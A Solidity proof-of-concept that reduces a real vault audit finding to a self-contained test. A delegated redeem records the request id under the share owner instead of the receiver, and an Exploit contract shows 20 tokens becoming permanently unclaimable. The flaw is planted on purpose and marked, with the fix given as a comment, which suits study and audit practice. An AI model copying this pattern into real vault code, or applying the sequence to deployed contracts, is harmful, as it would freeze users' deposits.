// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Amphor AsyncSynthVault — requestRedeem stores lastRedeemRequestId on the
    share owner instead of the receiver (Sherlock 2024-03, finding 30917).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground. One block:
    settle() advances the epoch in the same transaction. No vm.warp.

    Root cause: a delegated requestRedeem credits
    epochs[epochId].redeemRequestBalance[receiver] but writes
    lastRedeemRequestId[owner]. claimRedeem always loads
    lastRedeemRequestId[msg.sender] and that caller's bucket. After settle,
    the delegate's id is still 0 and the owner's bucket is empty, so the
    assets parked in the claimable silo cannot be withdrawn by either party.

    The blamed assignment is copied verbatim. The // @> VULN comment is the
    line above that statement. */

contract Asset {
    string public constant name = "Amphor Underlying";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// Holds the assets (or shares) of one epoch side. Approves the vault once.
contract Silo {
    constructor(Asset underlying) {
        underlying.approve(msg.sender, type(uint256).max);
    }
}

struct EpochData {
    uint256 totalSupplySnapshotForRedeem;
    uint256 totalAssetsSnapshotForRedeem;
    mapping(address => uint256) redeemRequestBalance;
}

contract AsyncSynthVault {
    Asset public asset;
    address public vaultOwner;
    uint256 public epochId;
    bool public vaultIsOpen;
    uint256 public lastSavedBalance;
    Silo public pendingSilo;
    Silo public claimableSilo;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public lastRedeemRequestId;
    mapping(uint256 => EpochData) internal epochs;

    event ClaimRedeem(
        uint256 indexed requestId,
        address indexed owner,
        address indexed receiver,
        uint256 assets,
        uint256 shares
    );

    constructor(Asset asset_) {
        asset = asset_;
        vaultOwner = msg.sender;
        epochId = 1;
        vaultIsOpen = true;
        pendingSilo = new Silo(asset_);
        claimableSilo = new Silo(asset_);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    /// First-deposit reduction: shares mint 1:1 with assets.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        require(vaultIsOpen, "vault closed");
        require(assets != 0, "zero deposit");
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets;
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function close() external {
        require(msg.sender == vaultOwner, "not owner");
        require(vaultIsOpen, "already closed");
        require(totalSupply != 0, "empty");
        lastSavedBalance = asset.balanceOf(address(this));
        vaultIsOpen = false;
    }

    /// Same-transaction epoch advance. Parks the pending redeem 1:1 into the claimable silo.
    function settle() external {
        require(msg.sender == vaultOwner, "not owner");
        require(!vaultIsOpen, "vault open");
        uint256 pendingShares = balanceOf[address(pendingSilo)];
        require(pendingShares != 0, "nothing pending");
        balanceOf[address(pendingSilo)] = 0;
        totalSupply -= pendingShares;
        epochs[epochId].totalAssetsSnapshotForRedeem = pendingShares;
        epochs[epochId].totalSupplySnapshotForRedeem = pendingShares;
        asset.transfer(address(claimableSilo), pendingShares);
        epochId += 1;
    }

    function requestRedeem(uint256 shares, address receiver, address owner, bytes calldata data) external {
        require(!vaultIsOpen, "vault open");
        if (msg.sender != owner) {
            uint256 allowed = allowance[owner][msg.sender];
            require(allowed >= shares, "allowance");
            allowance[owner][msg.sender] = allowed - shares;
        }
        require(previewClaimRedeem(receiver) == 0, "must claim first");
        require(shares != 0, "zero shares");
        require(shares <= balanceOf[owner], "exceeds shares");
        balanceOf[owner] -= shares;
        balanceOf[address(pendingSilo)] += shares;
        _createRedeemRequest(shares, receiver, owner, data);
    }

    function _createRedeemRequest(uint256 shares, address receiver, address owner, bytes calldata data)
        internal
        virtual
    {
        epochs[epochId].redeemRequestBalance[receiver] += shares;
        // FIX: lastRedeemRequestId[receiver] = epochId;
        // @> VULN: claimRedeem reads lastRedeemRequestId[msg.sender]; this stores the owner
        lastRedeemRequestId[owner] = epochId;
        if (data.length != 0) revert("receiver hook");
    }

    function claimRedeem(address receiver) external returns (uint256 assets) {
        assets = _claimRedeem(msg.sender, receiver);
    }

    function _claimRedeem(address owner, address receiver) internal returns (uint256 assets) {
        assets = previewClaimRedeem(owner);
        uint256 lastRequestId = lastRedeemRequestId[owner];
        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
        epochs[lastRequestId].redeemRequestBalance[owner] = 0;
        asset.transferFrom(address(claimableSilo), address(this), assets);
        asset.transfer(receiver, assets);
        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
    }

    function previewClaimRedeem(address owner) public view returns (uint256) {
        uint256 lastRequestId = lastRedeemRequestId[owner];
        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
        return _convertToAssets(shares, lastRequestId);
    }

    /// Amphor adds 1 to both snapshots. Equal snapshots therefore convert 1:1.
    function _convertToAssets(uint256 shares, uint256 requestId) internal view returns (uint256) {
        if (requestId == epochId) return 0;
        uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;
        uint256 totalSupplySnap = epochs[requestId].totalSupplySnapshotForRedeem + 1;
        return shares * totalAssets / totalSupplySnap;
    }

    function redeemRequestBalanceOf(uint256 id, address account) external view returns (uint256) {
        return epochs[id].redeemRequestBalance[account];
    }
}

contract Shareholder {
    Asset public asset;
    AsyncSynthVault public vault;

    constructor(Asset asset_, AsyncSynthVault vault_) {
        asset = asset_;
        vault = vault_;
    }

    function depositAll() external {
        uint256 assets = asset.balanceOf(address(this));
        asset.approve(address(vault), assets);
        vault.deposit(assets, address(this));
    }

    function approveDelegate(address spender) external {
        uint256 shares = vault.balanceOf(address(this));
        vault.approve(spender, shares);
    }

    function claim() external returns (uint256 assets) {
        assets = vault.claimRedeem(address(this));
    }
}

contract Delegate {
    function request(AsyncSynthVault vault, uint256 shares, address receiver, address owner) external {
        vault.requestRedeem(shares, receiver, owner, "");
    }

    function claim(AsyncSynthVault vault) external returns (uint256 assets) {
        assets = vault.claimRedeem(address(this));
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    AsyncSynthVault public vault; // CREATE nonce 2
    Shareholder public shareOwner; // CREATE nonce 3
    Delegate public delegate; // CREATE nonce 4
    uint256 public delegatePayout;
    uint256 public ownerPayout;
    uint256 public lockedAssets;

    constructor() {
        asset = new Asset();
        vault = new AsyncSynthVault(asset);
        shareOwner = new Shareholder(asset, vault);
        delegate = new Delegate();
    }

    function run() external {
        asset.mint(address(shareOwner), 20 ether);
        shareOwner.depositAll();
        shareOwner.approveDelegate(address(delegate));
        vault.close();
        uint256 shares = vault.balanceOf(address(shareOwner));
        require(shares == 20 ether, "owner does not hold 20 shares");
        delegate.request(vault, shares, address(delegate), address(shareOwner));
        vault.settle();
        delegatePayout = delegate.claim(vault);
        ownerPayout = shareOwner.claim();
        lockedAssets = asset.balanceOf(address(vault.claimableSilo()));
        require(vault.epochId() == 2, "epoch did not advance to 2");
        require(delegatePayout == 0, "delegate claimed assets");
        require(ownerPayout == 0, "owner claimed assets");
        require(lockedAssets == 20 ether, "20 assets are not locked");
        require(asset.balanceOf(address(shareOwner)) == 0, "owner recovered assets");
        require(asset.balanceOf(address(delegate)) == 0, "delegate recovered assets");
        require(vault.balanceOf(address(shareOwner)) == 0, "owner still holds shares");
        require(vault.balanceOf(address(delegate)) == 0, "delegate holds shares");
        require(vault.lastRedeemRequestId(address(shareOwner)) == 1, "owner id is not epoch 1");
        require(vault.lastRedeemRequestId(address(delegate)) == 0, "delegate id was written");
        require(vault.redeemRequestBalanceOf(1, address(delegate)) == 20 ether, "receiver bucket is not 20");
        require(vault.redeemRequestBalanceOf(1, address(shareOwner)) == 0, "owner bucket is not empty");
    }
}
